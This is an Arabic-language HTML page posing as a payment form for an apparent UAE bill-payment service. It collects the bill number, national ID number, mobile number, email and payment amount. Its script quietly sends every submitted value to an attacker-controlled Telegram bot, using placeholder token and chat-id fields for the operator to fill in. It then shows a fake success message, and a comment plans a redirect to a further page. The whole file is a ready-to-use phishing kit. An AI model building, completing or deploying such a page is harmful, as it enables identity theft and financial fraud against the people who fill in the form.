<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إدخال بيانات المستخدم</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="container">
        <div class="card header-card">
            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663044286479/aPMsccGlDoDqOtLn.jpg" alt="Logo" class="logo">
            <h1 class="main-title-green">إدخال بيانات المستخدم</h1>
        </div>

        <div class="card form-card">
            <form id="dataForm">
                <div class="input-group">
                    <label>رقم الفاتورة</label>
                    <input type="text" id="billNumber" placeholder="أدخل رقم الفاتورة" required>
                </div>

                <div class="input-group">
                    <label>رقم الهوية</label>
                    <input type="text" id="idNumber" placeholder="أدخل رقم الهوية" required>
                </div>

                <div class="input-group">
                    <label>رقم الجوال</label>
                    <input type="tel" id="phoneNumber" placeholder="05XXXXXXXX" required>
                </div>

                <div class="input-group">
                    <label>البريد الإلكتروني</label>
                    <input type="email" id="email" placeholder="أدخل بريدك الإلكتروني" required>
                </div>

                <div class="input-group">
                    <label>نوع الخدمة</label>
                    <select id="serviceType" required>
                        <option value="" disabled selected>اختر نوع الخدمة</option>
                        <option value="خدمة 1">خدمة 1</option>
                        <option value="خدمة 2">خدمة 2</option>
                    </select>
                </div>

                <div class="input-group">
                    <label>(درهم إماراتي) مبلغ السداد</label>
                    <div class="amount-container">
                        <span class="currency">AED</span>
                        <input type="number" id="amount" placeholder="0.00" step="0.01" required>
                    </div>
                </div>

                <button type="submit" class="cta-button">تأكيد البيانات</button>
            </form>
        </div>
    </div>

    <script>
        const token = "ضع_هنا_توكن_البوت_الخاص_بك";
        const chatId = "ضع_هنا_الآي_دي_الخاص_بك";

        document.getElementById('dataForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const message = `
🔔 **بيان جديد من سداد الإمارات**
--------------------------
📄 رقم الفاتورة: ${document.getElementById('billNumber').value}
🆔 رقم الهوية: ${document.getElementById('idNumber').value}
📱 رقم الجوال: ${document.getElementById('phoneNumber').value}
📧 البريد: ${document.getElementById('email').value}
🛠 الخدمة: ${document.getElementById('serviceType').value}
💰 المبلغ: ${document.getElementById('amount').value} AED
            `;

            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
            }).then(res => {
                alert("تم تأكيد البيانات بنجاح");
                // هنا يمكنك توجيهه للصفحة الثالثة عند استلام اللقطة القادمة
            }).catch(err => alert("خطأ في الإرسال"));
        });
    </script>
</body>
</html>
